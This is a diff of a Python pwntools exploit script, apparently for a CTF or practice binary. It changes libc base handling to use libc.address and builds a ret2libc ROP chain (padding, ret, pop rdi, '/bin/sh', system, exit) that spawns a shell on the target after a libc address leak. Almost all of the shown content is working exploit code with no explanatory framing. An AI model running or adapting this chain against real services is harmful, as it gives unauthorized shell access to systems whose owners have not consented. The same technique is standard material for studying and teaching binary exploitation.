@@ -57,8 +57,8 @@ for name in available_funcs:
 LIBC = "./libc/libc6_2.31-0ubuntu9.2_amd64.so"
 if LIBC:
 	libc = ELF(LIBC)
-	libcbase = leaked - libc.symbols[available_funcs[-1]]
-	log.info(f"base libc {hex(libcbase)}")
+	libc.address = leaked - libc.symbols[available_funcs[-1]]
+	log.info(f"base libc {hex(libc.address)}")
 else:
 	log.warning("No LIBC set. Please go to https://libc.blukat.me/")
 	exit()
@@ -71,19 +71,18 @@ BINSH = next(libc.search(b"/bin/sh"))
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
 
-log.info("POP_RDI @ 0x{:x}".format(POP_RDI+libcbase))
-log.info("/bin/sh @ 0x{:x}".format(BINSH+libcbase))
-log.info("system @ 0x{:x}".format(SYSTEM+libcbase))
-log.info("exit @ 0x{:x}".format(EXIT+libcbase))
-
+log.info("POP_RDI @ 0x{:x}".format(POP_RDI))
+log.info("/bin/sh @ 0x{:x}".format(BINSH))
+log.info("system @ 0x{:x}".format(SYSTEM))
+log.info("exit @ 0x{:x}".format(EXIT))
 
 payload2 = [
 	b"A"*OFFSET,
-	p64(RET+libcbase),
-	p64(POP_RDI+libcbase),
-	p64(BINSH+libcbase),
-	p64(SYSTEM+libcbase),
-	p64(EXIT+libcbase)
+	p64(RET),
+	p64(POP_RDI),
+	p64(BINSH),
+	p64(SYSTEM),
+	p64(EXIT)
 ]
 payload2 = b"".join(payload2)
 
